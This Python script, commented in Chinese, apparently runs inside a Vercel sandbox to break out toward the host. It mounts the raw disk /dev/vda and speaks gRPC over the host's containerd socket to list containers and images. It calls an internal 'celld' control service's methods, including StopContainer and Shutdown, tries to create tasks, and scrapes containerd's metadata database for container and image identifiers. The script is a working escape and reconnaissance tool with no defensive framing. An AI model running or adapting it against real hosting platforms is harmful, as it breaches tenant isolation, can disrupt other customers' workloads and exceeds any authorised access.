# -*- coding: utf-8 -*-
"""vda32_celld_plugin: containerd.sock 上 celld 插件方法 + 列表
P1: Tasks/Containers/Snapshots/Images 列表
P2: CelldService 插件方法探测 (Configure/SetWorkload/StartContainer/StopContainer/WaitContainer)
P3: Tasks/Create 错误观察
P4: meta.db 头部
输出落盘 + 哨兵 V32S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess

OUT = '/vercel/sandbox/v32s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=4):
    try:
        tmp = '/tmp/curl_req_%d.bin' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype,
               '-H', 'TE: trailers',
               '--data-binary', '@%s' % tmp,
               'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        return 'rc=%d' % r.returncode, r.stdout, r.stderr.decode('utf-8', errors='replace')[:150]
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b'', ''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:500].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{5,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:25]]))


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    csp = '/mnt/vdax/run/containerd/containerd.sock'

    # P1: 列表
    log('=== P1 lists ===')
    for tag, path, payload in [
        ('Tasks', '/containerd.services.tasks.v1.Tasks/List', b''),
        ('Containers', '/containerd.services.containers.v1.Containers/List', b''),
        ('Snapshots-bf', '/containerd.services.snapshots.v1.Snapshots/List', pstr(1, 'snapshotter==blockfile')),
        ('Snapshots-ov', '/containerd.services.snapshots.v1.Snapshots/List', pstr(1, 'snapshotter==overlayfs')),
        ('Images', '/containerd.services.images.v1.Images/List', b''),
    ]:
        rc, out, err = curl_h2(csp, path, grpc_env(payload), t=3)
        show('%s [%s]' % (tag, rc), out)
        if err:
            log('  err: %s' % err)
        time.sleep(0.15)

    # P2: celld 插件方法 (containerd.sock)
    log('=== P2 celld plugin methods ===')
    CELD = '/vercel.hive.celld.api.v1.CelldService'
    for tag, path in [
        ('Configure', CELD + '/Configure'),
        ('SetWorkload', CELD + '/SetWorkload'),
        ('StartContainer', CELD + '/StartContainer'),
        ('StopContainer', CELD + '/StopContainer'),
        ('WaitContainer', CELD + '/WaitContainer'),
        ('GetDriveStorageUsage', CELD + '/GetDriveStorageUsage'),
        ('Heartbeat', CELD + '/Heartbeat'),
        ('Shutdown', CELD + '/Shutdown'),
    ]:
        rc, out, err = curl_h2(csp, path, grpc_env(b''), t=3)
        show('celld %s [%s]' % (tag, rc), out, raw=True)
        if err:
            log('  err: %s' % err)
        time.sleep(0.15)

    # P3: Tasks/Create 错误观察
    log('=== P3 Tasks/Create ===')
    rc, out, err = curl_h2(csp, '/containerd.services.tasks.v1.Tasks/Create',
                           grpc_env(pstr(1, 'nonexistent_ctr_xyz')), t=4)
    show('TasksCreate [%s]' % rc, out, raw=True)
    if err:
        log('  err: %s' % err)

    # P4: meta.db 头部
    log('=== P4 meta.db head ===')
    try:
        p = '/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
        st = os.stat(p)
        log('meta.db size=%d' % st.st_size)
        with open(p, 'rb') as mf:
            head = mf.read(6 * 1024 * 1024)
        strs = re.findall(rb'[\x20-\x7e]{8,}', head)
        interesting = []
        for s in strs:
            t = s.decode(errors='replace')
            if any(k in t for k in ['ctr_', 'hvc_', 'sha256:', 'ecr', 'sandbox', 'snapshot', 'container', 'runc', 'blockfile', 'erofs']):
                interesting.append(t)
        log('meta.db strs (%d): %s' % (len(interesting), interesting[:50]))
    except Exception as e:
        log('meta.db ERR %s' % e)

    log('V32S_DONE')
    f.close()


if __name__ == '__main__':
    main()
